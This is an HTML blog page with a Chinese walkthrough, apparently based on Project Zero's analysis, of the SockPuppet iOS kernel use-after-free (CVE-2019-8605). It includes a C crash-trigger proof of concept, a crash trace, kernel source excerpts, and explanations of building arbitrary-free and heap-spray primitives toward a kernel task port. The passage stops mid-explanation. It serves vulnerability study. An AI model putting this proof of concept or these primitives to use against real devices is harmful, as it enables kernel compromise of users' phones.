<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: xnu - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">xnu</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-04-05T06:25:50.000Z" title="2022/4/5 14:25:50">2022-04-05</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-03T08:13:52.211Z" title="2022/5/3 16:13:52">2022-05-03</time></span><span class="level-item">an hour read (About 7429 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/04/05/iOS-SockPuppet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">iOS-SockPuppet漏洞利用</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞编号为CVE-2019-8605，在iOS 12.3中进行了修复，但是在12.4又被利用了，随后在iOS 12.4.1中进行了修复。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html</a></p>
<p>原理讲解视频：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=YV3jewkUJ54">https://www.youtube.com/watch?v=YV3jewkUJ54</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>此问题最早在2013年受到XNU的影响，并于2019年3月报告给Apple。然后在2019年5月在iOS 12.3中进行了修补（参考链接：<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806">https://bugs.chromium.org/p/project-zero/issues/detail?id=1806</a> 了完整的详细信息，包括iOS的漏洞分析，名为<code>SockPuppet</code>）。 2019年7月，然后发现此问题在iOS 12.4中也存在，后来在2019年8月下旬在iOS 12.4.1中进行了修补。</p>
<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>如何写一个 fuzz：</p>
<ol>
<li>先收集目标以往的漏洞；</li>
<li>在源代码中，找到漏洞对应的位置；</li>
<li>选择某一组件，该组件包含多个已公开漏洞；</li>
<li>编写fuzz；</li>
<li>fuzz该组件；</li>
<li>如果fuzz能够找到以前的漏洞，则它可能会发现新的漏洞；</li>
<li>当每次发现一个新的漏洞后，需要采取一定的措施，以防止再被命中。</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/677764/">https://lwn.net/Articles/677764/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md</a></p>
</blockquote>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    connect(s, (<span class="type">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    connect(s, (<span class="type">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    close(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>崩溃后的栈跟踪情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0 0x497a3d in free _asan_rtl_:3</span></span><br><span class="line"><span class="comment">#1 0x7f8bbe5f42cd in in6_pcbdetach /src/bsd/netinet6/in6_pcb.c:681:3</span></span><br><span class="line"><span class="comment">#2 0x7f8bbe6b06d0 in rip6_detach /src/bsd/netinet6/raw_ip6.c:829:2</span></span><br><span class="line"><span class="comment">#3 0x7f8bbe6af680 in rip6_abort /src/bsd/netinet6/raw_ip6.c:837:9</span></span><br><span class="line"><span class="comment">#4 0x7f8bbe6b0795 in rip6_disconnect /src/bsd/netinet6/raw_ip6.c:848:9</span></span><br><span class="line"><span class="comment">#5 0x7f8bbe10132f in sodisconnectlocked /src/bsd/kern/uipc_socket.c:1792:10</span></span><br><span class="line"><span class="comment">#6 0x7f8bbe1028dc in soconnectlock /src/bsd/kern/uipc_socket.c:1664:15</span></span><br><span class="line"><span class="comment">#7 0x7f8bbe133e00 in connectit /src/bsd/kern/uipc_syscalls.c:954:10</span></span><br><span class="line"><span class="comment">#8 0x7f8bbe133b25 in connect_nocancel /src/bsd/kern/uipc_syscalls.c:726:10</span></span><br><span class="line"><span class="comment">#9 0x7f8bbe6f22b4 in connect_wrapper /src/fuzzing/syscall_stubs.c:125:7</span></span><br></pre></td></tr></table></figure>

<p>崩溃实际是发生在free函数上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">in6_pcbdetach</span><span class="params">(<span class="keyword">struct</span> inpcb *inp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">                inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        m_freem(inp-&gt;in6p_options);</span><br><span class="line">                        inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line">                ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad, dangling pointer</span></span><br><span class="line">                ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">                <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        (<span class="type">void</span>) m_free(inp-&gt;inp_options);</span><br><span class="line">                        inp-&gt;inp_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>问题出现在对<code>ip6_freepcbopts</code>的调用上，在这里，开发者原本的意图是：在某些情况下，通过释放每个指针后将其置为NULL来重用socket选项。但由于<code>in6p_outputopts</code>是由一个指向另一个结构的指针来表示的，所以它们是由辅助函数</p>
<p><code>ip6_freepcbopts</code>释放的，该函数不知道<code>inp</code>的地址，所以不能清除<code>&amp;inp-&gt;in6p_outputopts</code>，这段代码忽略了这一点。</p>
<p>释放的缓冲区是由<code>setsockopt</code>创建的，意味着我们可以通过<code>getsockopt</code>和<code>setsockopt</code>来继续访问释放的缓冲区，分别代表着读取和写入原语。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="漏洞原语"><a href="#漏洞原语" class="headerlink" title="漏洞原语"></a>漏洞原语</h2><p>在有PAC的iOS上，漏洞利用会更加麻烦一些，需要使用一个漏洞来获取内核读写，而代码执行需要别的利用方式。</p>
<p>一个进程在内核中表示两次：一个作为Mach任务，一个作为BSD proc。</p>
<p>包含悬空指针的<code>inp6_outputopts</code>的<code>inpcb</code>：</p>
<p><img src="https://img.4hou.com/uploads/ueditor/php/upload/image/20200114/1578996014165070.png" alt="Project Zero对 iOS 12.4 内核任意地址读写漏洞的深度分析（CVE-2019-8605）"></p>
<p>通过<code>[get/set]sockopt</code>查看这些选项的<code>getter</code>和<code>setter</code>，获取<code>minmtu</code>和<code>prefer_tempaddr</code>字段的整数是很直接的，可以让我们直接从释放的缓冲区中读取数据。如果我们能够回收<code>in6po_pktinfo</code>指针，我们可以自由读取20个字节。</p>
<p><code>ip6_getpcbopt</code>实现片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IPV6_PKTINFO:</span><br><span class="line">    <span class="keyword">if</span> (pktopt &amp;&amp; pktopt-&gt;ip6po_pktinfo)</span><br><span class="line">        optdata = (<span class="type">void</span> *)pktopt-&gt;ip6po_pktinfo;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">XXX:</span> we don&#x27;t have to do this every time... */</span></span><br><span class="line">        bzero(&amp;null_pktinfo, <span class="keyword">sizeof</span> (null_pktinfo));</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;null_pktinfo;</span><br><span class="line">    &#125;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="keyword">struct</span> in6_pktinfo); <span class="comment">// 20 bytes</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPV6_USE_MIN_MTU:</span><br><span class="line">    <span class="keyword">if</span> (pktopt)</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;pktopt-&gt;ip6po_minmtu;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;defminmtu;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPV6_PREFER_TEMPADDR:</span><br><span class="line">    <span class="keyword">if</span> (pktopt)</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;pktopt-&gt;ip6po_prefer_tempaddr;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;defpreftemp;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p><code>ip6po_minmtu</code>和<code>ip6po_prefer_tempaddr</code>在内存中相邻，且按照<code>qword</code>对齐，所以，如果能够使用其他包含指针的对象回收这块内存，就能够读出指针并绕过ASLR。还可以利用这些字段来进行堆喷，我们在<code>in6po_pktinfo</code>字段和<code>mintmu</code>字段中的<code>magic</code>重合的位置喷出包含我们选择的任意指针值的对象。这样我们就可以反复读出<code>minmtu</code>字段，所以如果看到我们的<code>magic</code>，我们就知道在<code>in6po_pktinfo</code>中取消引用指针是安全的。一般来说，读取<code>inp6_outputopts</code>是安全的，因为我们知道它已经被映射了，但是<code>in6po_pktinfo</code>就不安全了，因为它可能已经被其他垃圾回收了，指向未映射或不可读的内存。</p>
<p>不幸的是，<code>setsockopt</code>路径不像<code>getsockopt</code>路径那样容易使用。大多数相关的选项都是只针对root的，或者是高度受限的。这使得<code>IPV6_2292PKTINFO</code>&#x2F;<code>IPV6_PKTINFO</code>仍然是最好的选项，但在测试和阅读代码时，除了高度约束的值之外，似乎无法在那里写任何东西。<code>ipi6_addr</code>字段，看起来很适合写任意数据，但必须设置为0，才能通过未指定的检查。而接口索引必须是有效的，这就约束了我们的低值。如果接口为0，就可以释放选项。这意味着我们只能在内存的任何地方写入16个空字节加上一个非零的4字节小整数。这对于开发来说当然足够了，但是释放的情况呢？只要你传入一个包含20个空字节的<code>pktinfo</code>结构，<code>ip6_setpktopt</code>就会帮你调用<code>ip6_clearpktopts</code>，最后调用<code>free(pktopt-&gt;ip6po_pktinfo, M_IP6OPT)</code>。记住，<code>in6po_pktinfo</code>是我们的受控指针，所以这意味着我们有一个任意的free。更妙的是，我们可以在不知道其区域的情况下释放任何对象。这是因为<code>free</code>是<code>kfree_addr</code>的封装器，它代表你查找zone。为了保持后期开发的通用性，我选择了任意<code>free</code>原语，而不是约束的写原语。</p>
<h2 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h2><p>利用<code>IOSurface</code>进行堆喷。</p>
<h2 id="tfp0"><a href="#tfp0" class="headerlink" title="tfp0"></a>tfp0</h2><p>这是<code>task_for_pid</code>的缩写，它会向你返回一个Mach端口，并带有给定pid的任务的发送权。当使用<code>pid=0</code>来调用它时，将返回一个内核任务端口。</p>
<blockquote>
<p>端口类似一个描述消息队列的文件描述符，内核中每个此类消息队列都有一个接收者，和一个或多个发送者。对于一个给定的端口名，可以根据访问该队列的权限来向该队列发送或接收Mach消息。</p>
<p>如果我们具有任务端口的发送权，就可以利用mach_vm_allocate，mach_vm_deallocate，mach_vm_protect和mach_vm_read_overwrite之类的函数，来读取、写入和分配内存。</p>
</blockquote>
<p>为了更好地模拟tfp0调用，先看一个消息传递的例子，消息头结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>    msgh_bits; <span class="comment">// &quot;disposition&quot;, e.g. MACH_MSG_TYPE_COPY_SEND</span></span><br><span class="line">  <span class="type">mach_msg_size_t</span>    msgh_size;</span><br><span class="line">  <span class="type">mach_port_t</span>        msgh_remote_port; <span class="comment">// destination port name</span></span><br><span class="line">  <span class="type">mach_port_t</span>        msgh_local_port;</span><br><span class="line">  <span class="type">mach_port_name_t</span>   msgh_voucher_port;</span><br><span class="line">  <span class="type">mach_msg_id_t</span>      msgh_id;</span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>

<p>上面有两个重要的字段，<code>msgh_remote_port </code>包含目标端口名称，如果我们可以访问它，它将是内核任务端口的名称；<code>msgh_bits</code>指定了多个标志，其中之一是对我们发送的不同端口名称的消息的属性。</p>
<p>当我们想从用户区发送消息时，我们需要一个mach陷阱，它相当于系统调用，称为<code>mach_msg_overwrite_trap</code>，<code>MACH_SEND_MSG</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">mach_msg_overwrite_trap</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> mach_msg_overwrite_trap_args* args)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="type">mach_msg_return_t</span> mr = MACH_MSG_SUCCESS;</span><br><span class="line">  <span class="type">vm_map_t</span> <span class="built_in">map</span> = current_map();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">    <span class="type">ipc_space_t</span> space = current_space();</span><br><span class="line">    <span class="type">ipc_kmsg_t</span> kmsg;</span><br><span class="line"></span><br><span class="line">    mr = ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    mr = ipc_kmsg_copyin(kmsg, space, <span class="built_in">map</span>, override, &amp;option);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    mr = ipc_kmsg_send(kmsg, option, msg_timeout);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>如果要把消息传递到内核任务端口，需要了解<code>ipc_kmsg_get</code>，<code>ipc_kmsg_copyin</code>和<code>ipc_kmsg_send</code>的工作方式。<code>ipc_kmsg_get</code>将消息从调用任务的地址空间复制到内核中；<code>ipc_kmsg_copyin</code>通过调用<code>ipc_kmsg_copyin_header</code>获取消息头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">ipc_kmsg_copyin_header</span><span class="params">(<span class="type">ipc_kmsg_t</span> kmsg, <span class="type">ipc_space_t</span> space,</span></span><br><span class="line"><span class="params">                                         <span class="type">mach_msg_priority_t</span> override,</span></span><br><span class="line"><span class="params">                                         <span class="type">mach_msg_option_t</span> *optionp)</span> &#123;</span><br><span class="line">  <span class="type">mach_msg_header_t</span> *msg = kmsg-&gt;ikm_header;</span><br><span class="line">  <span class="type">mach_msg_bits_t</span> mbits = msg-&gt;msgh_bits &amp; MACH_MSGH_BITS_USER;</span><br><span class="line">  <span class="type">mach_port_name_t</span> dest_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_remote_port);</span><br><span class="line">  <span class="type">mach_port_name_t</span> reply_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_local_port);</span><br><span class="line"></span><br><span class="line">  <span class="type">mach_msg_type_name_t</span> dest_type = MACH_MSGH_BITS_REMOTE(mbits);</span><br><span class="line">  <span class="type">ipc_object_t</span> dest_port = IO_NULL;</span><br><span class="line">  <span class="type">ipc_port_t</span> dest_soright = IP_NULL;</span><br><span class="line">  <span class="type">ipc_entry_t</span> dest_entry = IE_NULL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dest_name != reply_name) &#123;</span><br><span class="line">    <span class="comment">// nedwill: this converts name to ipc_entry_t</span></span><br><span class="line">    dest_entry = ipc_entry_lookup(space, dest_name);</span><br><span class="line">    <span class="keyword">if</span> (dest_entry == IE_NULL) &#123;</span><br><span class="line">      <span class="keyword">goto</span> invalid_dest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nedwill: this converts ipc_entry_t to ipc_port_t (and checks capability)</span></span><br><span class="line">    kr = ipc_right_copyin(space, dest_name, dest_entry, dest_type, FALSE,</span><br><span class="line">                          &amp;dest_port, &amp;dest_soright, &amp;release_port, &amp;assertcnt);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">      <span class="keyword">goto</span> invalid_dest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  msg-&gt;msgh_bits =</span><br><span class="line">      MACH_MSGH_BITS_SET(dest_type, reply_type, voucher_type, mbits);</span><br><span class="line">  msg-&gt;msgh_remote_port = (<span class="type">ipc_port_t</span>)dest_port;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ipc_kmsg_copyin_header</code>用于将远程端口名称转换为端口对象，更新<code>msg-&gt; msgh_remote_port</code>指向实际对象，而不是存储特定于任务的名称。消息头有几个名称字段，我们希望<code>kernel_task</code>端口是我们的目标端口。<code>ipc_space_t space</code>参数表示当前正在运行的任务的IPC空间，相当于文件描述符表。首先，我们在IPC空间中查找<code>dest_name</code>，得到代表它的<code>ipc_entry_t</code>。每个<code>ipc_entry_t</code>都有一个叫做<code>ie_bits</code>的字段，它包含了我们的任务与相关端口交互的权限。下面是IPC入口结构的样子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> *<span class="title">ie_object</span>;</span> <span class="comment">// pointer to the ipc_port_t</span></span><br><span class="line">  <span class="type">ipc_entry_bits_t</span> ie_bits; <span class="comment">// our rights (receive/send/send-once/etc.)</span></span><br><span class="line">  <span class="type">mach_port_index_t</span> ie_index;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们发送的消息头有一个<code>disposition</code>的目的地，它描述了我们希望我们的消息用远程端口名的能力做什么。这里是实际验证和使用的地方：</p>
